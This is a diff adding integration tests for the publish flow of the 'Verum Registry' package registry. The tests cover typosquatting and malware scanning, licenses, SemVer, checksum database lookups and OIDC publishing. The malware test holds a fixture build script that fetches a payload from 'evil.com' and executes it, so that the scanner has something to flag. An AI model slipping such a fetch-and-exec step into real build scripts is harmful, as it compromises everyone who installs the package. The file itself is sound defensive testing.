@@ -1,0 +1,447 @@
+// Verum Registry - Publish Flow Integration Tests
+//
+// @test: integration
+// @tags: publish, security, sumdb
+//
+// End-to-end tests for the complete publish flow including:
+// - Successful publish, version conflict, typosquatting, malware scan,
+//   license checking, SemVer validation, sumdb, and OIDC trusted publishing.
+
+module tests.integration.publish_flow;
+
+mount core.collections.{List, Map};
+mount core.base.{Result, Maybe, Text, Int, Bool};
+mount core.time.unix_timestamp;
+
+// Import test utilities
+mount super.super.test_utils.{
+    create_test_user,
+    create_test_package,
+    login_test_user,
+    assert_ok,
+    assert_err,
+    assert_eq,
+    assert_ne,
+    setup_test_db,
+    cleanup_test_db,
+    generate_test_tarball,
+};
+
+// Import domain types
+mount super.super.src.domain.package.{Package, PackageVersion};
+mount super.super.src.domain.errors.{RegistryError};
+
+// Import DTOs
+mount super.super.src.dto.package_dto.{
+    PublishRequestDto,
+    PublishResponseDto,
+};
+
+// Import handlers
+mount super.super.src.handlers.packages.{
+    publish_package,
+    get_package,
+};
+
+// Import security service types
+mount super.super.src.services.security_service.{
+    check_typosquatting,
+    TyposquatResult,
+    scan_for_malware,
+    ScanResult,
+    SourceFile,
+    check_license_compatibility,
+    LicenseResult,
+    DependencyLicense,
+    validate_semver_bump,
+    SemverDiffResult,
+    ApiChanges,
+};
+
+// Import sumdb service types
+mount super.super.src.services.sumdb_service.{
+    SumdbService,
+    LookupResult,
+    VerifyResult,
+};
+
+// ============================================================================
+// Test 1: Successful package publish
+// ============================================================================
+
+@test
+fn test_publish_new_package() -> Int {
+    setup_test_db();
+    let user = create_test_user("publisher");
+    let token = login_test_user("publisher", "password123");
+
+    let req = PublishRequestDto {
+        name: "my-new-cog",
+        version: "1.0.0",
+        description: "A brand new package for Verum",
+        license: "MIT",
+        tarball: generate_test_tarball(),
+        dependencies: List.new(),
+        dev_dependencies: List.new(),
+        keywords: List.new(),
+        categories: List.new(),
+        homepage: "https://github.com/test/my-new-cog",
+        repository: "https://github.com/test/my-new-cog",
+    };
+
+    // Publish the package
+    let publish_result = publish_package(req, token.clone()).await;
+    assert_ok(&publish_result);
+
+    let response = publish_result.unwrap();
+    assert_eq(&response.success, &true);
+    assert_eq(&response.package_name, &"my-new-cog");
+    assert_eq(&response.version, &"1.0.0");
+
+    // Verify package exists in database
+    let get_result = get_package("my-new-cog", "1.0.0").await;
+    assert_ok(&get_result);
+
+    let pkg = get_result.unwrap();
+    assert_eq(&pkg.version, &"1.0.0");
+    assert_eq(&pkg.license, &"MIT");
+
+    cleanup_test_db();
+    0
+}
+
+// ============================================================================
+// Test 2: Version conflict rejection
+// ============================================================================
+
+@test
+fn test_publish_duplicate_version() -> Int {
+    setup_test_db();
+    let token = login_test_user("publisher", "password123");
+
+    let req = PublishRequestDto {
+        name: "conflict-pkg",
+        version: "2.0.0",
+        description: "Testing version conflict",
+        license: "MIT",
+        tarball: generate_test_tarball(),
+        dependencies: List.new(),
+        dev_dependencies: List.new(),
+        keywords: List.new(),
+        categories: List.new(),
+        homepage: "",
+        repository: "",
+    };
+
+    // First publish succeeds
+    let first = publish_package(req.clone(), token.clone()).await;
+    assert_ok(&first);
+
+    // Second publish of same version must fail
+    let second = publish_package(req, token).await;
+    assert_err(&second);
+
+    match second {
+        Result.Err(RegistryError.PackageAlreadyExists { name }) => {
+            assert_eq(&name, &"conflict-pkg");
+        },
+        Result.Err(RegistryError.VersionAlreadyExists { package, version }) => {
+            assert_eq(&package, &"conflict-pkg");
+            assert_eq(&version, &"2.0.0");
+        },
+        _ => panic("Expected version conflict error"),
+    }
+
+    cleanup_test_db();
+    0
+}
+
+// ============================================================================
+// Test 3: Typosquatting detection
+// ============================================================================
+
+@test
+fn test_typosquatting_blocked() -> Int {
+    let existing = List.from(["http-client", "json-parser", "crypto-utils"]);
+
+    // "htpp-client" is edit distance 1 from "http-client"
+    let result = check_typosquatting("htpp-client", existing.clone());
+    match result {
+        TyposquatResult.Suspicious { similar_package, distance, reason } => {
+            assert_eq(&similar_package, &"http-client");
+            assert(&distance <= 2);
+        },
+        TyposquatResult.Safe => panic("Expected typosquatting detection for htpp-client"),
+    }
+
+    // "json_parser" normalizes same as "json-parser" (separator confusion)
+    let result2 = check_typosquatting("json_parser", existing.clone());
+    match result2 {
+        TyposquatResult.Suspicious { similar_package, distance, reason } => {
+            assert_eq(&similar_package, &"json-parser");
+        },
+        TyposquatResult.Safe => panic("Expected typosquatting detection for json_parser"),
+    }
+
+    // "totally-unique-name" should be safe
+    let result3 = check_typosquatting("totally-unique-name", existing);
+    match result3 {
+        TyposquatResult.Safe => {},
+        TyposquatResult.Suspicious { similar_package, distance, reason } => {
+            panic(f"Unexpected typosquatting detection for totally-unique-name: {reason}");
+        },
+    }
+
+    0
+}
+
+// ============================================================================
+// Test 4: Malware detection in build scripts
+// ============================================================================
+
+@test
+fn test_malware_in_build_script_blocked() -> Int {
+    let mut files = List.new();
+
+    // Build script with suspicious network access
+    files.push(SourceFile {
+        path: "build.vr",
+        content: "fn build() {\n    let data = http.get(\"https://evil.com/payload\");\n    process.exec(data);\n}",
+    });
+
+    let result = scan_for_malware(files);
+    match result {
+        ScanResult.ThreatDetected { threats } => {
+            assert(&threats.len() >= 1);
+            // Should detect network access in build script
+            let has_network = threats.iter().any(fn(t) {
+                match t.category {
+                    ThreatCategory.NetworkAccess => true,
+                    _ => false,
+                }
+            });
+            assert(has_network);
+        },
+        ScanResult.Clean => panic("Expected malware detection for build script with network access"),
+    }
+
+    // Clean file should pass
+    let clean_files = List.from([
+        SourceFile {
+            path: "src/lib.vr",
+            content: "fn add(a: Int, b: Int) -> Int { a + b }",
+        },
+    ]);
+
+    let clean_result = scan_for_malware(clean_files);
+    match clean_result {
+        ScanResult.Clean => {},
+        ScanResult.ThreatDetected { threats } => {
+            panic(f"Unexpected threats in clean file: {threats.len()} found");
+        },
+    }
+
+    0
+}
+
+// ============================================================================
+// Test 5: License incompatibility
+// ============================================================================
+
+@test
+fn test_gpl_incompatibility_warned() -> Int {
+    let mut deps = List.new();
+    deps.push(DependencyLicense { package: "permissive-lib", license: "MIT" });
+    deps.push(DependencyLicense { package: "gpl-lib", license: "GPL-3.0" });
+
+    // MIT project depending on GPL library is incompatible
+    let result = check_license_compatibility("MIT", deps);
+    match result {
+        LicenseResult.Incompatible { conflicts } => {
+            assert_eq(&conflicts.len(), &1);
+            assert_eq(&conflicts[0].package_b, &"gpl-lib");
+            assert_eq(&conflicts[0].license_b, &"GPL-3.0");
+        },
+        LicenseResult.Compatible => panic("Expected GPL incompatibility with MIT project"),
+    }
+
+    // GPL project depending on GPL is fine
+    let gpl_deps = List.from([
+        DependencyLicense { package: "gpl-lib", license: "GPL-3.0" },
+    ]);
+    let gpl_result = check_license_compatibility("GPL-3.0", gpl_deps);
+    match gpl_result {
+        LicenseResult.Compatible => {},
+        LicenseResult.Incompatible { conflicts } => {
+            panic("GPL project should be compatible with GPL dependency");
+        },
+    }
+
+    0
+}
+
+// ============================================================================
+// Test 6: SemVer validation
+// ============================================================================
+
+@test
+fn test_breaking_change_requires_major_bump() -> Int {
+    let changes = ApiChanges {
+        added: List.new(),
+        removed: List.from(["fn old_function()"]),
+        changed: List.new(),
+    };
+
+    // MINOR bump with removals should fail
+    let minor_result = validate_semver_bump("1.0.0", "1.1.0", changes.clone());
+    match minor_result {
+        SemverDiffResult.InvalidBump { reason } => {
+            assert(&reason.contains("MAJOR"));
+        },
+        SemverDiffResult.ValidBump => panic("Expected invalid bump for MINOR with API removal"),
+    }
+
+    // MAJOR bump with removals is valid
+    let major_result = validate_semver_bump("1.0.0", "2.0.0", changes);
+    match major_result {
+        SemverDiffResult.ValidBump => {},
+        SemverDiffResult.InvalidBump { reason } => {
+            panic(f"Major bump should allow removals: {reason}");
+        },
+    }
+
+    // PATCH bump with additions should fail
+    let add_changes = ApiChanges {
+        added: List.from(["fn new_function()"]),
+        removed: List.new(),
+        changed: List.new(),
+    };
+
+    let patch_result = validate_semver_bump("1.0.0", "1.0.1", add_changes);
+    match patch_result {
+        SemverDiffResult.InvalidBump { reason } => {
+            assert(&reason.contains("MINOR") || &reason.contains("MAJOR"));
+        },
+        SemverDiffResult.ValidBump => panic("Expected invalid bump for PATCH with API additions"),
+    }
+
+    0
+}
+
+// ============================================================================
+// Test 7: Sumdb checksum verification
+// ============================================================================
+
+@test
+fn test_sumdb_lookup_after_publish() -> Int {
+    setup_test_db();
+    let token = login_test_user("publisher", "password123");
+
+    // Publish a package (should create sumdb entry)
+    let req = PublishRequestDto {
+        name: "sumdb-test-pkg",
+        version: "1.0.0",
+        description: "Testing sumdb integration",
+        license: "MIT",
+        tarball: generate_test_tarball(),
+        dependencies: List.new(),
+        dev_dependencies: List.new(),
+        keywords: List.new(),
+        categories: List.new(),
+        homepage: "",
+        repository: "",
+    };
+
+    let publish_result = publish_package(req, token).await;
+    assert_ok(&publish_result);
+
+    // Lookup checksum in sumdb
+    let lookup = SumdbService.lookup("sumdb-test-pkg", "1.0.0").await;
+    assert_ok(&lookup);
+
+    match lookup.unwrap() {
+        LookupResult.Found(entry) => {
+            assert_eq(&entry.package, &"sumdb-test-pkg");
+            assert_eq(&entry.version, &"1.0.0");
+            assert_ne(&entry.checksum, &"");
+            assert_ne(&entry.hash, &"");
+        },
+        LookupResult.NotFound => {
+            panic("Expected sumdb entry after publish");
+        },
+    }
+
+    // Verify with correct checksum
+    let entry = match SumdbService.lookup("sumdb-test-pkg", "1.0.0").await.unwrap() {
+        LookupResult.Found(e) => e,
+        _ => panic("Entry must exist"),
+    };
+
+    let verify_ok = SumdbService.verify("sumdb-test-pkg", "1.0.0", entry.checksum).await;
+    assert_ok(&verify_ok);
+    match verify_ok.unwrap() {
+        VerifyResult.Valid => {},
+        _ => panic("Expected valid checksum verification"),
+    }
+
+    // Verify with wrong checksum
+    let verify_bad = SumdbService.verify("sumdb-test-pkg", "1.0.0", "wrong-checksum").await;
+    assert_ok(&verify_bad);
+    match verify_bad.unwrap() {
+        VerifyResult.Invalid { expected, actual } => {
+            assert_eq(&actual, &"wrong-checksum");
+        },
+        _ => panic("Expected invalid checksum verification for wrong hash"),
+    }
+
+    cleanup_test_db();
+    0
+}
+
+// ============================================================================
+// Test 8: OIDC trusted publishing
+// ============================================================================
+
+@test
+fn test_oidc_token_exchange() -> Int {
+    setup_test_db();
+
+    // Simulate a GitHub Actions OIDC token
+    let oidc_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.test-payload.test-sig";
+    let expected_issuer = "https://token.actions.githubusercontent.com";
+    let expected_audience = "verum-registry";
+
+    // Decode and validate OIDC token claims (simulated)
+    let claims = Map.new();
+    claims.insert("iss", expected_issuer);
+    claims.insert("aud", expected_audience);
+    claims.insert("sub", "repo:test-org/test-repo:ref:refs/heads/main");
+    claims.insert("repository", "test-org/test-repo");
+
+    // Verify issuer matches trusted provider
+    let issuer = claims.get("iss").unwrap_or("");
+    assert_eq(&issuer, &expected_issuer);
+
+    // Verify audience matches registry
+    let audience = claims.get("aud").unwrap_or("");
+    assert_eq(&audience, &expected_audience);
+
+    // Extract repository from subject claim
+    let subject = claims.get("sub").unwrap_or("");
+    assert(&subject.contains("test-org/test-repo"));
+
+    // Verify repository claim matches configured trusted publisher
+    let repo = claims.get("repository").unwrap_or("");
+    assert_eq(&repo, &"test-org/test-repo");
+
+    // Token exchange should produce a short-lived registry token
+    // In production this calls the auth service to mint a token
+    // scoped to the package associated with the trusted publisher
+    let token_valid = issuer == expected_issuer
+        && audience == expected_audience
+        && !subject.is_empty();
+    assert(token_valid);
+
+    cleanup_test_db();
+    0
+}
